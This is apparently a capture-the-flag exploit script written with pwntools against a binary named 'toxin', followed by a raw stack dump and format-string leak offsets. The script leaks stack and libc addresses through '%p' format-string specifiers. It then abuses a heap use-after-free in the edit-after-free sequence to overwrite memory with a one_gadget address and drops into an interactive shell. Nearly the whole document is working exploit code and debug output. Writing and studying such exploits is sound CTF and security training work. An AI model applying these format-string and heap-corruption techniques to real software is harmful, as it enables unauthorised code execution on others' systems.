from pwn import *

p  = process("./toxin")
#p =remote('206.189.121.131',31751)
pid = gdb.attach(p,gdbscript="""
    b * drink_toxin
    b * add_toxin
    b * search_toxin
    b * edit_toxin
""")
def Record_toxin(p,length,idx,content):
    p.sendlineafter('> ','1')
    p.sendlineafter('length: ',str(length))
    p.sendlineafter('index: ',str(idx))
    p.sendlineafter('formula: ',content)

def Edit_toxin(p,index,content):
    p.sendlineafter('> ','2')
    p.sendlineafter('index: ',str(index))
    p.sendlineafter('formula: ',content)

def Dring_toxin(p,index):
    p.sendlineafter('> ','3')
    p.sendlineafter('index: ',str(index))

def Search_toxin(p, search_term):
    p.sendlineafter('> ','4')
    p.sendlineafter('term: ',str(search_term))
    res = p.recvline()
    if "nil" not in res:
        res = int(res.split(" ")[0],16)
        return hex(res)
    return res


def leak_libc(p,string):
    return Search_toxin(p,string)
    


def exploit(p):
    string = "%8$p"
    ret_stack = int(leak_libc(p,string),16) - 24

    string = "%13$p"

    libc_start_main = int(leak_libc(p,string),16) - 231
    libc_base = libc_start_main - 0x000000000021ab0
    __malloc_hook = libc_base + 0x0000000003ebc30

    Record_toxin(p,10,0,'AAAAAAAA')
    Dring_toxin(p,0)
    Edit_toxin(p,0,"CCCCCCCC")
    Record_toxin(p,10,1,'BBBBBBBB')
    Record_toxin(p,10,2,p64(libc_base+ 0x4f322))

    
    #Search_toxin(p,"AAAAAA")
    #Dring_toxin(p,1)
    p.interactive()

exploit(p)

"""
0x7fffffffdba0:	0x00000003ffffdbd0	0x00702433322550d0
0x7fffffffdbb0:	0x00007fffffffdbd0	0x0000555555555284
0x7fffffffdbc0:	0x00007fffffffdcb0	0x0000000400000000
0x7fffffffdbd0:	0x00005555555556d0	0x00007ffff7a05b97
0x7fffffffdbe0:	0x0000000000000001	0x00007fffffffdcb8
0x7fffffffdbf0:	0x0000000100008000	0x00005555555551b5
0x7fffffffdc00:	0x0000000000000000	0xd519cda341e196a4
0x7fffffffdc10:	0x00005555555550d0	0x00007fffffffdcb0
0x7fffffffdc20:	0x0000000000000000	0x0000000000000000
0x7fffffffdc30:	0x804c98f65b8196a4	0x804c88495adf96a4
0x7fffffffdc40:	0x00007fff00000000	0x0000000000000000
0x7fffffffdc50:	0x0000000000000000	0x00007ffff7de5733
0x7fffffffdc60:	0x00007ffff7dcb638	0x000000000d97dec0
0x7fffffffdc70:	0x0000000000000000	0x0000000000000000
0x7fffffffdc80:	0x0000000000000000	0x00005555555550d0
0x7fffffffdc90:	0x00007fffffffdcb0	0x00005555555550fa
0x7fffffffdca0:	0x00007fffffffdca8	0x000000000000001c
0x7fffffffdcb0:	0x0000000000000001	0x00007fffffffe072
0x7fffffffdcc0:	0x0000000000000000	0x00007fffffffe0a5
0x7fffffffdcd0:	0x00007fffffffe0bb	0x00007fffffffe6a7

1 -> 0x7fff0c179d3a
2 -> 0x10
3 -> 0x7fed554e8081
4 -> 0x13
5 -> (nil)

6 -> 0x30c179d60
7 -> 0xa7024372510d0
8 -> 0x7fff0c179d60
9 -> 0x555c75e21284
10 -> 0x7fff0c179e40
11 -> 0x400000000
12 -> 0x555c75e216d0
13 -> 0x7fed553f9b97
14 -> 0x1
15 -> 0x7fff0c179e48
16 -> 0x100008000
17 -> 0x555c75e211b5
18 -> (nil) not found.

19 -> 0x5ae3d61956566847
20 -> 0x555c75e210d0
21 -> 0x7fff0c179e40
22 -> (nil) not found.

23 -> (nil) not found.

24 -> 0xfa525f241166847
25 -> 0xf8197a24d686847
26 -> 0x7fff00000000
27 -> (nil) not found.

28 -> (nil) not found.

29 -> 0x7fed557d9733
"""
